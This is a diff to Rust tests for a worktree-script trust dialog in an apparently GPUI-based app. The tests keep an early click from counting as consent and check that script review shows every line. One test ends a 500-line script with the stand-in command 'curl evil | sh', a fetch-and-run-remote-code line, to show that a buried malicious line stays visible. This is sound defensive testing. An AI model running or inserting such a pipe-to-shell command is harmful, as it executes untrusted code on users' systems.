@@ -3,8 +3,8 @@
 // Not a glob: the parent's `gpui::*` would shadow the `#[test]` that
 // `gpui::test` expands to.
 use super::{
-    Checkout, HerdrWindow, Launch, MAX_SHOWN_LINES, NavigationTarget, Page, ScriptKind, Step,
-    Trust, config, launch, script_lines,
+    Checkout, HerdrWindow, Launch, NavigationTarget, Page, ScriptKind, Step, Trust, config, launch,
+    script_lines,
 };
 use crate::{sidebar::layout_tests::fixture_window, window::MockPeer};
 use herdr_client::protocol::ClientMessage;
@@ -151,6 +151,11 @@ fn a_run_script_is_located_reviewed_trusted_and_typed_into_a_new_tab(
     assert!(cx.debug_bounds("worktree-script-trust-run").is_some());
     cx.update(|window, cx| {
         view.update(cx, |view, cx| {
+            // A click landing as the question opens is not an answer.
+            view.trust_worktree_script(window, cx);
+            assert_eq!(view.menu.page, Some(Page::WorktreeScript));
+            assert_eq!(step(view), "asking");
+            view.arm_worktree_script();
             view.trust_worktree_script(window, cx);
             assert!(view.menu.page.is_none());
             assert_eq!(step(view), "opening");
@@ -239,6 +244,7 @@ fn trust_covers_one_file_and_a_changed_file_asks_again(cx: &mut gpui::TestAppCon
             assert_eq!(step(view), "asking");
             view.poll_worktree_script(window, cx);
             assert_eq!(view.menu.page, Some(Page::WorktreeScript));
+            view.arm_worktree_script();
             view.skip_worktree_script(window, cx);
             assert_eq!(step(view), "none");
             assert!(view.menu.page.is_none() && view.removal.is_none());
@@ -358,10 +364,11 @@ fn reviewed_text_shows_what_runs() {
         script_lines("echo hi\n\necho\u{202e}lle\u{0007}\tx\n"),
         ["echo hi", "", "echo\u{fffd}lle\u{fffd}\tx"]
     );
-    let long = "x\n".repeat(MAX_SHOWN_LINES + 5);
+    // Nothing is cut: trusting covers every line.
+    let long = "x\n".repeat(500) + "curl evil | sh";
     let lines = script_lines(&long);
-    assert_eq!(lines.len(), MAX_SHOWN_LINES + 1);
-    assert_eq!(lines.last().unwrap(), "\u{2026} 5 more lines");
+    assert_eq!(lines.len(), 501);
+    assert_eq!(lines.last().unwrap(), "curl evil | sh");
 }
 
 #[test]
